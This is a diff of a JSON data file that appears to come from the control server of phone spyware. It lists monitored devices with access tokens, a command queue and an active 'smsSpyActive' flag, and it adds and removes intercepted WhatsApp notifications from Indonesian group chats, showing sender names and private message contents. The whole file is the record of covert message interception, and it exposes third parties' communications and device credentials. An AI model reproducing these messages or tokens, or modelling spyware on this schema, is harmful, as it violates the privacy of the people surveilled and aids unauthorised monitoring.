@@ -4,7 +4,7 @@
     "deviceName": "HP-AIM-7C2F",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "5c459e8712f2a7ee2b4192ea89156763",
-    "lastSeen": 1775048332881,
+    "lastSeen": 1775048335800,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:32:40.020Z",
@@ -20,6 +20,22 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13905 pesan): ~ Farras",
+        "content": "Aihh gataooo lagi sakit gamao mikir apa apa",
+        "time": "01/04 20:58",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775048335984
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎14435 pesan dari 10 chat",
+        "time": "01/04 20:58",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775048335915
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB OPTES EXO X XEMET (24 pesan): ~ hi cadangan",
@@ -4003,22 +4019,6 @@
         "time": "01/04 20:34",
         "pkg": "com.whatsapp",
         "receivedAt": 1775046865374
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (3 pesan): ~ Call Me Zal7Sex",
-        "content": "🔗 TikTok · — Zal Infinity | penuhkan komen #Zal7Sex kalo mau apk ga maintenance😈\n\nlink video\nhttps://vt.tiktok.com/ZSHjYWLJT",
-        "time": "01/04 20:34",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046865156
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎main botwiee bersama (13758 pesan): ~ syafa karamoy",
-        "content": "CWO MONYEP🤬",
-        "time": "01/04 20:34",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046863783
       }
     ],
     "galleryPhotos": [],
@@ -4049,7 +4049,7 @@
     "deviceName": "HP-AIM-22BD",
     "ownerUsername": "51a6566b-13c6-424c-8f68-421c28fdc099",
     "token": "ee7716168abf03ae6470b12578967076",
-    "lastSeen": 1775048331942,
+    "lastSeen": 1775048334927,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-01T10:33:59.233Z",
@@ -4065,6 +4065,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "‎main botwiee bersama (13905 pesan): ~ Farras",
+        "content": "Aihh gataooo lagi sakit gamao mikir apa apa",
+        "time": "01/04 20:58",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1775048335900
+      },
       {
         "appName": "WhatsApp",
         "sender": "‎GB OPTES EXO X XEMET (24 pesan): ~ hi cadangan",
@@ -8056,14 +8064,6 @@
         "time": "01/04 20:34",
         "pkg": "com.whatsapp",
         "receivedAt": 1775046865358
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (3 pesan): ~ Call Me Zal7Sex",
-        "content": "🔗 TikTok · — Zal Infinity | penuhkan komen #Zal7Sex kalo mau apk ga maintenance😈\n\nlink video\nhttps://vt.tiktok.com/ZSHjYWLJT",
-        "time": "01/04 20:34",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1775046865339
       }
     ],
     "galleryPhotos": [],
